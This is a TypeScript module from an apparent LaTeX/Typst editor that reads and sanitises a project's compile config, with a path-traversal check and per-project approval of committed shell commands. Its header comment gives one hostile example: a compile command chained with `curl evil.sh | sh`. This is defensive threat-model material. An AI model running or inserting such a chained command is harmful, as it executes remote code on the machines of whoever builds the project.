// The project's own compile configuration, in .texpile/config.json, so it travels with the folder.
//
// Which file is the main one, which typesetter builds it and where the output lands are properties
// of the DOCUMENT, not of the person reading it. Keeping them in localStorage meant every
// collaborator who cloned the repo had to rediscover them, and a guest in a shared session never
// could. `lastFile` deliberately stays local: committing where you left off would rewrite the file
// on every tab switch and conflict with everyone.
//
// The command is different from the rest, and the difference is the whole design of this module.
// Texpile RUNS it. A committed command means cloning a repository can execute arbitrary shell on
// your machine, and `latexmk -pdf main.tex; curl evil.sh | sh` reads as unremarkable in a diff
// nobody looks at twice. So a command out of the file is never applied on its own: it has to be
// approved once per project on this machine, and everything else applies immediately. This is what
// VS Code's Workspace Trust is for, scoped down to the one setting here that can execute.
import { readTextFile, statFile, writeTextFile } from '$lib/workspace/fileSystem';
import { ensureTexpileIgnore } from '$lib/workspace/texpileDir';
import { isSafeRel } from '$lib/collab/protocol';
import type { CompileOutputs } from '$lib/workspace/workspaceStore';
import { isSpellLanguage, type SpellLanguage } from '$lib/editor/spellcheck/languages/spellLanguages';

const CONFIG_PATH = '.texpile/config.json';

export type ProjectFormatConfig = {
	command?: string;
	outputs?: CompileOutputs;
	/** latex only: live mode (the incremental per-page engine) instead of the shell command */
	liveMode?: boolean;
	/** typst only: tinymist's incremental preview instead of the shell command */
	preview?: boolean;
};

export type ProjectConfig = {
	/** bumped only for a change an older build could not read */
	v: 1;
	/** root-relative main file. Its extension is also what names the typesetter, so there is no
	 *  separate field for that - a project cannot ask for a build its main file cannot produce. */
	main?: string;
	/** append a marker echo after the compile command to detect completion; absent = on */
	completionMarker?: boolean;
	latex?: ProjectFormatConfig;
	typst?: ProjectFormatConfig;
	/** the language spelling is checked in, over what the documents name; absent = what they name */
	spelling?: { language: SpellLanguage };
};

function configPath(root: string) {
	return `${root.replace(/[\\/]+$/, '')}/${CONFIG_PATH}`;
}

/**
 * Does the file exist at all?
 *
 * Separate from reading it because "absent" and "present but unreadable" have to be told apart:
 * seeding from local state is right for the first, and would destroy someone's config for the
 * second - a file from a newer Texpile reads as null here too.
 */
export async function hasProjectConfig(root: string): Promise<boolean> {
	return (await statFile(configPath(root))).exists;
}

/**
 * One format section, with everything that is not the right shape dropped.
 *
 * Output paths are only type-checked, not path-checked: locally they may be absolute (a
 * documented escape hatch when auto-detection guesses wrong), and they round-trip through this
 * file, so rejecting absolute here would silently clear a user's own override on reopen. They are
 * read-side values - where to LOOK for the PDF and log - never executed.
 */
function cleanFormat(v: unknown): ProjectFormatConfig | undefined {
	if (typeof v !== 'object' || v === null) return undefined;
	const raw = v as { command?: unknown; outputs?: unknown; liveMode?: unknown; preview?: unknown };
	const out: ProjectFormatConfig = {};
	if (typeof raw.command === 'string' && raw.command.trim()) out.command = raw.command;
	if (typeof raw.outputs === 'object' && raw.outputs !== null) {
		const o = raw.outputs as { pdf?: unknown; log?: unknown };
		const outputs: CompileOutputs = {};
		if (typeof o.pdf === 'string' && o.pdf) outputs.pdf = o.pdf;
		if (typeof o.log === 'string' && o.log) outputs.log = o.log;
		if (outputs.pdf || outputs.log) out.outputs = outputs;
	}
	if (typeof raw.liveMode === 'boolean') out.liveMode = raw.liveMode;
	if (typeof raw.preview === 'boolean') out.preview = raw.preview;
	return Object.keys(out).length ? out : undefined;
}

/**
 * null when there is no config, or one we cannot read: a project without one is the normal case.
 *
 * What IS read is sanitised field by field, because this file is hand-editable and git-merged, so
 * any field can hold anything. The main file must be a root-relative .tex/.typ - the same rule the
 * file tree's "Set as main file" enforces, minus which this value would put a path of the config
 * author's choosing into {main} and the macro scanner (`"main": "../../outside"` walks out of the
 * project). An empty string stays: it is the explicit "no main" that absent deliberately is not.
 * A field that fails its check is treated as not written, never "corrected" back into the file -
 * the file self-heals on the next settings save, which rebuilds it from adopted state.
 */
export async function readProjectConfig(root: string): Promise<ProjectConfig | null> {
	try {
		const parsed: unknown = JSON.parse(await readTextFile(configPath(root)));
		if (typeof parsed !== 'object' || parsed === null) return null;
		const raw = parsed as { v?: unknown; main?: unknown; latex?: unknown; typst?: unknown };
		// a newer file is not read at all rather than half-applied: half of someone's build config
		// is worse than none of it
		if (raw.v !== 1) return null;
		const cfg: ProjectConfig = { v: 1 };
		if (raw.main === '') cfg.main = '';
		else if (typeof raw.main === 'string' && isSafeRel(raw.main) && /\.(tex|typ)$/i.test(raw.main)) cfg.main = raw.main;
		if (typeof (raw as { completionMarker?: unknown }).completionMarker === 'boolean')
			cfg.completionMarker = (raw as { completionMarker: boolean }).completionMarker;
		const latex = cleanFormat(raw.latex);
		if (latex) cfg.latex = latex;
		const typst = cleanFormat(raw.typst);
		if (typst) cfg.typst = typst;
		const spelling = (raw as { spelling?: { language?: unknown } }).spelling?.language;
		if (isSpellLanguage(spelling)) cfg.spelling = { language: spelling };
		return cfg;
	} catch {
		return null;
	}
}

export async function writeProjectConfig(root: string, cfg: ProjectConfig): Promise<void> {
	try {
		// before the write, so the directory is never left holding an un-ignored file: most projects
		// reach .texpile through a compile setting rather than a comment, and seeding the rule only
		// from the comment log meant those showed up untracked in git status
		await ensureTexpileIgnore(root);
		await writeTextFile(configPath(root), JSON.stringify(cfg, null, '\t') + '\n');
	} catch {
		// a read-only or unwritable project still compiles; the local copy is the source of truth
	}
}
